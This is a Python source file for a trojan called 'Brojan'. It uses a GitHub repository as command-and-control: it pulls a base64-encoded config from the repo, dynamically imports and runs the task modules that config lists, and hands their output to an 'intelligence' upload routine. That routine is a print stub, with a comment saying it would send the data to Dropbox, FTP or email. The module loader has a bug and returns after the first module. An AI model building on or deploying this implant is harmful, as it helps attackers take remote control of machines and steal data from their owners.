import json
import base64
import sys
import time
import random
import importlib
import threading
import queue
import os
from github import Github


class GitHubSession():
    username = "mantvydasb"

    def __init__(self, username=username):
        password = input("Github password: ")
        session = Github(username, password)
        self.repository = session.get_repo(f"{self.username}/network-playground")
        self.branch = self.repository.get_branch("master")

    def getFileContents(self, pathToFile):
        return self.repository.get_contents(pathToFile)


class Brojan():
    id = "1"
    configPath = "brojan/configs/" + id + ".json"
    intelligenceStoragePath = "data/%s/" % id
    modules = []
    configured = False
    tasksQueue = queue.Queue()
    github = ''

    def __init__(self):
        self.github = GitHubSession()
        config = self.getConfig()
        modules = self.loadModules(config)
        intelligence = self.executeModules(modules)
        self.uploadIntelligence(intelligenceData=intelligence)

    def uploadIntelligence(self, intelligenceData=None):
        # This, would obviously be uploading stuff back to server of our choice (dropbox, zippyshare, email, ftp, etc.)
        print(f"Uploading intelligence back home... {str(intelligenceData)}")

    def executeModules(self, modules):
        return [module.execute() for module in modules]

    def getConfig(self):
        config = self.getFileContents(self.configPath)
        config = base64.b64decode(config.content).decode("utf8")
        return json.loads(config)

    def getFileContents(self, filePath):
        return self.github.getFileContents(filePath)

    def loadModules(self, config):
        modules = []
        for module in config['modules']:
            print(f"Loading module '{module}' ")
            newModule = importlib.import_module(f'modules.{module}')
            modules.append(newModule)
            return modules
        self.configured =  True

Brojan()


